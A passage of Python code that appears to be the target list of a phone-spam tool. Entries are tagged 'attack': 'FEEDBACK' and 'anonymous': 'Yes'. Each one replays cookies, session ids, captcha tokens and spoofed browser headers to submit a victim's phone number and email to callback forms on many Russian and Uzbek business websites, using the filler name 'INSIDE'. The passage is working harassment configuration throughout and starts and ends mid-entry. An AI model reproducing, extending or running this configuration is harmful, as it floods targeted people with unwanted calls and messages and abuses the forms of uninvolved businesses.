            'data': f'------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n26585\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.5.6.1\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f26585-o1\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="_wpcf7_recaptcha_response"\r\n\r\n03AAYGu2QsQQ1LeSyxshAep_DoZe0hm18lpcQnrKCX6CNp9Q7UerHOdkww57GCfMMy8KC_TaSaW6y5nPDeCm3ves8QATcDaySggnjZYtcUGnTH6-g6iAKd-PpmfmYZMg0D74anRy3EiIOzzTozaO3-_aReq8j5ydMCDiawCzj-bumwSJ-CrFeKeg9fmJLMqqLMX6HdvSXutYcKdfZek50ONGUftFpbz5wcsd1TLZCAHrK2uv2pQs7A5ID4mvm4JNh46BA--w3wG8rHy1i6RuFr6iSsWOS7XbD5tmnMTCMZvMgks2-BttxZvBSdCXgBl6PGU_k_x2jceH59O0iMD_spADyk5mq5OJgLqQST6IkIS0SeCdWxn5Oipp0kSBndhfQd0jwi_BoCoiK2cDbz2Qs1H0Dcd9EJLI6aRzXrDdTyrEGCu6PLmGipATUCGzCiJ7TQcosOwbe9wKzyKAgiWuowz2omVLNssqLClpsYxhIEp_E20a5iI0y8-Xs5KPPEoSUTEANg263PVt6t1qiHCLzr4AyNaO-3dUSxnA\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="city"\r\n\r\nНижневартовск\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="to"\r\n\r\nzayavka@dantser.ru, 310213@dantser.ru, 310211@dantser.ru\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="offer"\r\n\r\nКиномания\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="hide-for-business"\r\n\r\ndisplay:block;\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="akciy"\r\n\r\n\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="camera"\r\n\r\n1\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="archive"\r\n\r\nбез архива\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="tarife"\r\n\r\nhd\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="cameras-info"\r\n\r\n0\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="cameras-archive"\r\n\r\nбез архива\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="cameras-quality"\r\n\r\nhd\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="cameras-total-sum"\r\n\r\n0\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="cameras-month-sum"\r\n\r\n0\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="cctv-info"\r\n\r\n1\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="your-name"\r\n\r\n\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="tel-970"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH\r\nContent-Disposition: form-data; name="hide-title"\r\n\r\nundefined\r\n------WebKitFormBoundarykz9rxJvpcBSXycSH--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Playtoday.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://playtoday.ru/local/ajax/callback_form.php',
            'cookies': {'PHPSESSID': 'Uy4grmQAQQqRJ1nucn4IO3800mLqQKrL', 'location': '%7B%22city%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22region%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22city_type_full%22%3Anull%2C%22coords%22%3A%7B%22lat%22%3A%2255.752289%22%2C%22lon%22%3A%2237.619621%22%7D%7D', '_ym_uid': '1687980973707967594', '_ym_d': '1687980973', '_ym_visorc': 'w', 'BITRIX_SMP_TZ': 'Asia/Tashkent', '_gid': 'GA1.2.820854702.1687980974', '_gat_UA-103804149-1': '1', 'tmr_lvid': '0e7ddd3fa8ac72450e1ab3db48cfc4ce', 'tmr_lvidTS': '1687980973741', '_ga_KBNHE20232': 'GS1.1.1687980973.1.0.1687980973.60.0.0', '_ga': 'GA1.1.2066467607.1687980974', 'tmr_detect': '1%7C1687980975100', '_ym_isad': '1', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A3%2C%22EXPIRE%22%3A1687985940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'advcake_track_id': '0aa757de-1982-f9e0-010a-8ffe7e2356ce', 'advcake_session_id': '314e32b3-6dc5-826b-84de-df8e4a6dfcec', 'BX_USER_ID': 'df6b78785c26e128fe5d601d03d3ebc2', 'FINGERPRINT_ID': '0e22ac8c7bb06c69d72e80df3b711c83'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://playtoday.ru', 'Referer': 'https://playtoday.ru/auth/registration/?back_url=/auth/registration/?type=registration&?type=registration', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': f'sessid=751c5e955c805f589754404649b64ed8&form=callback&URL=https%3A%2F%2Fplaytoday.ru%2Fauth%2Fregistration%2F&PHONE=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&AGREEMENT=%D0%94%D0%B0',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Ochkarik.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ochkarik.ru/api/forms/call-us',
            'cookies': {'__ddg1_': 'jcaO0rRzhylZJJSc1aWj', 'xid': 'Cm6pNOmTCUpVPN9tPxH047KKjr3XgEIA', '_cacampaign': 'Y6Ljx9', '_casource': 'cityads', 'utm_source': 'cityads', 'utm_campaign': 'Y6Ljx9', 'utm_medium': 'cpa', '_userGUID': '0:ljg4gk6f:SxX61~gZLJw_VaB3brSBQScwoBZUS7uf', 'dSesn': '045dfd99-ece3-133f-5c3b-b2f9ef891fbc', '_dvs': '0:ljg4gk6f:vzw_sO8m00hA_X_WiB7D~g5_R1S1viVs', 'uxs_uid': 'b8b87be0-15eb-11ee-b3d2-05ab2fc8e4e2', 'tmr_lvid': '30239eada093139a130718f4557cccd2', 'tmr_lvidTS': '1687981267323', '_ym_uid': '1687981267915850947', '_ym_d': '1687981267', 'adspire_uid': 'AS.894992038.1687981267', 'advcake_track_id': 'd1832037-a21f-6e73-eda1-8229e496b606', 'advcake_session_id': '2362de3f-ecba-5d2f-a46a-693a05bdcd5f', 'advcake_track_url': 'https%3A%2F%2Fochkarik.ru%2F%3Futm_source%3Dcityads%26utm_medium%3Dcpa%26utm_campaign%3DY6Ljx9%26advcake_params%3D9a6Z1YQSEXZFuWU', 'advcake_utm_partner': 'cityads', 'advcake_utm_webmaster': 'Y6Ljx9', 'advcake_click_id': '9a6Z1YQSEXZFuWU', '_ym_isad': '1', '_ym_visorc': 'w', '_gid': 'GA1.2.1786739946.1687981269', '_gcl_au': '1.1.412460788.1687981269', '_ga': 'GA1.1.1903082876.1687981269', '_ga_7M7ZTGE9Z2': 'GS1.1.1687981268.1.0.1687981268.60.0.0', 'furl': 'https%3A%2F%2Fochkarik.ru%2F%3Futm_source%3Dcityads%26utm_medium%3Dcpa%26utm_campaign%3DY6Ljx9%26advcake_params%3D9a6Z1YQSEXZFuWU', 'fref': 'https%3A%2F%2Fochkarik.ru', 'aprt_last_partner': 'cityads', 'supportOnlineTalkID': 'sSDgMAzzekeuuG3vymzf86WrWHwT6D6Z', 'tmr_detect': '0%7C1687981277328'},
            'headers': {'authority': 'ochkarik.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://ochkarik.ru', 'referer': 'https://ochkarik.ru/?utm_source=cityads&utm_medium=cpa&utm_campaign=Y6Ljx9&advcake_params=9a6Z1YQSEXZFuWU', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'name': 'INSIDE', 'phone': f'+{number}', 'city': 'Москва', 'firstTime': '09:00', 'lastTime': '21:00',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Pentabox.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://pentabox.ru', 'Referer': 'https://pentabox.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'formservices%5B%5D=32306916a9b51f3ab2d2fb5ac07df952&formservices%5B%5D=d895bc4c72d901e2893c7ff97baf038d&tildaspec-formname=%D0%97%D0%B0%D1%8F%D0%B2%D0%BA%D0%B0+%D1%82%D0%B5%D1%85%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%BA%D0%B0&Name=INSIDE&Email={email()}&tildaspec-phone-part%5B%5D-iso=+998&tildaspec-phone-part%5B%5D={str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}&Phone=+998 {str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}&Selectbox=%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%BE%D0%B1%D1%80%D0%B0%D1%82%D0%BD%D1%8B%D0%B9+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA&Textarea=INSIDE&form-spec-comments=&tildaspec-cookie=_ym_uid%3D1687696655622083077%3B+_ym_d%3D1687696655%3B+_ym_isad%3D1%3B+tildauid%3D1687696656069.552130%3B+tildasid%3D1687696656069.578852%3B+_ga%3DGA1.2.1388107316.1687696656%3B+_gid%3DGA1.2.2094477162.1687696656%3B+_ym_visorc%3Dw%3B+previousUrl%3Dpentabox.ru%252Fcontact&tildaspec-referer=https%3A%2F%2Fpentabox.ru%2Fcontact&tildaspec-formid=form137650630&tildaspec-formskey=6bd852b1a14b2b89d7e7addc4ebdf7ea&tildaspec-version-lib=02.001&tildaspec-pageid=7883182&tildaspec-projectid=1035889&tildaspec-lang=RU&tildaspec-fp=6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773131303068383338',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'WiFiLine.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://wifiline.ru', 'Referer': 'https://wifiline.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'formservices[]': ['3b6d2a85ad66c1154d3f44d1b2f33066', '80bfcdbf772c1490c5b0dd3c263d3569', '25a68f7d3c1ebbc4528cff264ecd33c3',], 'Name': 'INSIDE', 'tildaspec-phone-part[]-iso': '+998', 'tildaspec-phone-part[]': f'{str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}', 'Phone': f'+998 {str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}', 'Тип видеонаблюдения': 'Охранное', 'form-spec-comments': '', 'tildaspec-cookie': 'tildauid=1687856513427.944337; tildasid=1687856513427.426625; _ym_uid=1687856515539180134; _ym_d=1687856515; _ym_isad=1; _ym_visorc=w; previousUrl=wifiline.ru%2F', 'tildaspec-referer': 'https://wifiline.ru/#0', 'tildaspec-formid': 'form461988701', 'tildaspec-formskey': 'a920a03adc40088bc4b5b29fbc9f7d7a', 'tildaspec-version-lib': '02.001', 'tildaspec-pageid': '28584878', 'tildaspec-projectid': '3635382', 'tildaspec-lang': 'RU', 'tildaspec-fp': '6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773130373868383338', 'tildaspec-tildacaptcha': '03AL8dmw9vkX7zQoG-qcQGOCn-bsnbBhNEYNxR_7_sOiH368rLqPtnLjbyjDGkxQ96MevukQVC_QhDervdPKkGoTSgrJb2hsX0xFmP7Mv_nExE04ju7Pg9o9nwLVmomTytb8QpAJpWQmZTyUCLKKniAmrZgZ7E7dk1WAZvSKyPzfeAYMwBpd3zP2rSrfIZImkntCsApkQV5QqRZYWhqNBxc1zGyh9gRYZTCU0Qx--TksU8L69F46-w9tciA9XqJNhg2qvl2_EJFa9hBzQTLqgAYhygOf_GI1NngCCX4VA7qNRvXW6G7yzxPs0601yUi9R0bCH2_UPqSntLemQrqJMXrcFQ75T09GjlEFKG3TnT6_wXCmC2AWUtILQdbikNJdlRkH1f_RJuNMQ8kfSQ-zLKST9bToEeaVwCfbqEl_6kKIMIOJkVToEW5o3W0RAWCwJ-YQNC8MjVkv0qfNbf4x5Enjf_OHrZtE6_8dvIux7GbCBPvSTlmdehEA9nXNwyjyGkcXI4IzcefJsA4XQhLzn0fBTKA1jY1ovvNaaiL2DkUHeQmay7KNWZT5QGlvTvWooZAdodvNPHCcyJ',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Custom-Service.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.custom-service.com', 'Referer': 'https://www.custom-service.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'formservices[]': ['1fcef5a472e04d47bc370aad33215a34', '36ac94c25f637d26a9d19f47e4081491', '914fb55106295e2fab4ac6cb939d4733', '43a2cf95dc3bfd79f568fd053fb17ff2', 'a7c153b8c62d9879d90455643eee8ef4', 'b1939f9b11fcc97b1d802a6a5bfd1b4c', '8e0ee011cc86b758e8914da9eae0afd1', '287bed0b2da4cddb2e88903d311abcc7', '6b7d70831626f8f0940bd2a2be37e9a2',], 'tildaspec-formname': 'Заявка на услуги меню', 'name': 'INSIDE', 'email': email(), 'tildaspec-phone-part[]-iso': '+998', 'tildaspec-phone-part[]': f'{str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}', 'phone': f'+998 {str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:]}', 'service': 'Ответственное хранение', 'commentary': 'INSIDE', 'confidentiality ': 'yes', 'not_the_first_shipment': 'yes', 'legal_person': 'yes', 'form-spec-comments': '', 'tildaspec-cookie': 'v1_referrer_callibri=; v1_data=; _ym_uid=1687867956287190850; _ym_d=1687867956; _ym_isad=1; clbvid=649ad24db991ec4d5a1c64df; _ym_visorc=w; tildauid=1687867957875.866985; tildasid=1687867957875.538049; previousUrl=www.custom-service.com%2Ftilda%2Fpopup%2Frec499324268%2Fopened', 'tildaspec-referer': 'https://www.custom-service.com/', 'tildaspec-formid': 'form499324268', 'tildaspec-formskey': '5a2fff2bb1b1174ca5aa1eeb46157261', 'tildaspec-version-lib': '02.001', 'tildaspec-pageid': '30790893', 'tildaspec-projectid': '6157261', 'tildaspec-lang': 'RU', 'tildaspec-fp': '6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773131303768383338',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Spa-Beauty.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': 'http://recall.uz/mycall/phone.php',
            'headers': {'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Referer': 'http://spa-beauty.uz/', 'User-Agent': user_agent()[1],},
            'params': {'hcode': '7101', 'city': ['', 'Москва',], 'sid': 'RFEqPO8XxNtlKqdS', 'cookid': 'undefined', 'url': 'http://spa-beauty.uz/?utm_source=dostavkainfo_uz#', 'phone': f' {number}', 'wp_code': 'DC898977E3C924EEFD3ECE36713AFB7A', 'lang': 'ru', 'night_hour': '10', 'night_minute': '0', 'office_id': '0', 'referer': '',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Kangatraining.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://kangatraining.ru/wp-admin/admin-ajax.php',
            'cookies': {'PHPSESSID': '5da009dce36ed41038e4b0d04e52ae24', '_ym_uid': '1687981891891008155', '_ym_d': '1687981891', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarysxniropRSqB6wjDq', 'Origin': 'http://kangatraining.ru', 'Referer': 'http://kangatraining.ru/obuchenie/obratnaja-svjaz/', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n63\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="form_id"\r\n\r\na00236d\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="form_fields[name]"\r\n\r\nINSIDE\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="form_fields[email]"\r\n\r\n{number}\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="form_fields[24009e9]"\r\n\r\n{email()}\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="form_fields[message]"\r\n\r\nINSIDE\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="action"\r\n\r\nelementor_pro_forms_send_form\r\n------WebKitFormBoundarysxniropRSqB6wjDq\r\nContent-Disposition: form-data; name="referrer"\r\n\r\nhttp://kangatraining.ru/obuchenie/obratnaja-svjaz/\r\n------WebKitFormBoundarysxniropRSqB6wjDq--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Herbalifeuzbekistan.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://leads.herbalife.ru/lead-form/',
            'headers': {'authority': 'leads.herbalife.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://herbalifeuzbekistan.com', 'referer': 'https://herbalifeuzbekistan.com/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': f'sessid=d1dc585d0b5fddca1e7e64d1ea8a3741&is_restore=&FROM_PAGE=https%3A%2F%2Fherbalifeuzbekistan.com%2F&UF_LANGUAGE=ru&SOCIAL_GROUP=&is_insta1=&is_insta=&BVF_REFERER=https%3A%2F%2Fherbalifeuzbekistan.com%2F&UF_CHECKBOX=true&UF_UTM_MEDIUM=&UF_UTM_SOURCE=(direct)&UF_UTM_CAMPAIGN=&UF_UTM_TERM=&UF_UTM_CONTENT=&UF_BACKURL=&UF_MEMBER_ID=&UF_SOCIAL=&UF_CONTENT_ID=herbalifeuz&UF_FROM_PAGE=https%3A%2F%2Fherbalifeuzbekistan.com%2Fru%2Fbasket%2Forder%2F%2F&conditions=on&UF_GOALS%5B%5D=&UF_FIRST_NAME=INSIDE&UF_PHONE=+998 {str(number)[3:]}&UF_CITY=Tashkent&UF_EMAIL={email()}&UF_COUNTRY=2205&UF_COUNTRY=2205&UF_STREET=-&g-recaptcha-response=03AAYGu2Tdr64wS6bd_O6nPpS2O1mX0kHpNve4VOJmZzRoQrQhsyAGiwa2Ra_Us5WuS7nqdwdl-BhqKXxbaXIHYUKBLgN8Re5-emk7ZwXUbHJSTolTAlEZUyoObY2ENMDLPSPzpKvEOelVtyVNMYmxMbllMxka5G2M4ktPgHi8By-XpdAXyXgmu5QhCrXe1bTiqkEBJOr_VayBQwkfHT4LtwIiftzFhZUkLnPXH7-C7TeUgxZJ7MkNG2w5NzyI8I9oTugjdSUk4kIZCY2oZbJiCR45MxbTVer0QcLFvYEfb9FUkIzcBBCi-tyUHaLmujBJjxtUBQkEYEcJTkmdI-hek1W-Ly_8K12hGlU9HznUWQBwijr_tlqlzD0qwvqcN1pb5Z-3_mIZV2rsdeXqJul_zE3fxQC4l3KEneLx2uISs3cjMXi34ZU81X2-a37a_JDa0I1A241DQsD2s6M_y6aSQ4AvhqBBCCWITz0OmhLlevbWQEpzBCrTMe_nfqSeWxfypidvSDTtFf1IPhUShMfGOB1uLxiBmYkC_lNc77ton4HmlRuOogMfQbo&UF_MAILING=Y&UF_AGE=&CPC=&is_business=&cur_lang=ru&is_bvf=N&order_id=&userRef=&ref_name=&ref_city=&utm_source_custom=&goals_list=&UF_FORM_LANG=ru&UF_SEND_CLIENT_EMAIL=1&business_card_request=',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'NextMall.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://core.nextmall.uz/graphql',
            'headers': {'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Origin': 'http://nextmall.uz', 'Referer': 'http://nextmall.uz/', 'User-Agent': user_agent()[1], 'accept': '*/*', 'content-type': 'application/json',},
            'json': {'operationName': 'createMessage', 'variables': {'name': 'INSIDE', 'phone': number, 'receiver': 'Marketing department', 'comment': 'INSIDE',}, 'query': 'mutation createMessage($name: String!, $receiver: String!, $phone: String!, $comment: String) {\n  createMessage(\n    name: $name\n    phone: $phone\n    receiver: $receiver\n    comment: $comment\n  ) {\n    phone\n    name\n    receiver\n    __typename\n  }\n}\n',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Istv.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://istv.uz/ajax/connect/',
            'cookies': {'PHPSESSID': '7ppsgvhnj9qvnc3cjnic5m3421', '_ym_uid': '1688067493286505490', '_ym_d': '1688067493', '_ym_isad': '1',},
            'headers': {'authority': 'istv.uz', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://istv.uz', 'referer': 'https://istv.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'district=14&address=596&kv_inp=44&prichina=%D0%9D%D0%BE%D0%B2%D0%BE%D0%B5+%D0%BF%D0%BE%D0%B4%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5+(%D0%98%D0%BD%D1%82%D0%B5%D1%80%D0%BD%D0%B5%D1%82)&fio=INSIDE&phone={number}&message=INSIDE&submit=true',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Jihozvent.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://jihozvent.uz:2118/api/mail',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryAafbPF3Z0zGEUYX5', 'Origin': 'https://jihozvent.uz', 'Referer': 'https://jihozvent.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryAafbPF3Z0zGEUYX5\r\nContent-Disposition: form-data; name="name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryAafbPF3Z0zGEUYX5\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryAafbPF3Z0zGEUYX5\r\nContent-Disposition: form-data; name="comment"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryAafbPF3Z0zGEUYX5--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'St.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://st.uz/form',
